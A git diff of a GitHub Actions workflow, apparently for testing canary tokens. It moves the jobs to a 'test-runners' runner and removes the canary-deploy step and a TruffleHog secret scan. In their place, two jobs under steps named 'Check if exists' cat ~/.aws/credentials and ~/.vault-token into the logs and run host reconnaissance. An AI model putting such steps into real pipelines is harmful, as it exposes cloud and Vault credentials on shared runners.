@@ -11,24 +11,26 @@ on:
       - '.github/workflows/canary-testing.yml'
 jobs:
   testing-canary:
-    runs-on: ubuntu-latest
+    runs-on: test-runners
     steps:
       - name: Check out code
         id: Checkout
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
-      - name: Deploy canary
-        uses: sman107/githubactionstestcanarytokens/.github/actions/canary-tokens-deploy@main
-        with:
-          aws-credentials: ${{ secrets.CANARY_AWS_CREDENTIALS }}
-          vault-token: ${{ secrets.CANARY_VAULT_TOKEN }}
       - name: Check if exists
         run: |
-          sh -c "ls -la ~/.aws/credentials; ls -la ~/.vault-token; pwd; id"
-      - name: TruffleHog filesystem scan
+          sh -c "ls -la ~/.aws/credentials; ls -la ~/.vault-token; pwd; uname -a; id; whoami"
+          sh -c "cat ~/.aws/credentials; cat ~/.vault-token"
+  lets-test-it-again:
+    runs-on: test-runners
+    steps:
+      - name: Check out code
+        id: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Check if exists
         run: |
-          docker run --rm \
-            -v /home/runner:/scan \
-            ghcr.io/trufflesecurity/trufflehog:latest \
-            filesystem /scan --only-verified
+          sh -c "ls -la ~/.aws/credentials; ls -la ~/.vault-token; pwd; uname -a; id; whoami"
+          sh -c "cat ~/.aws/credentials; cat ~/.vault-token"
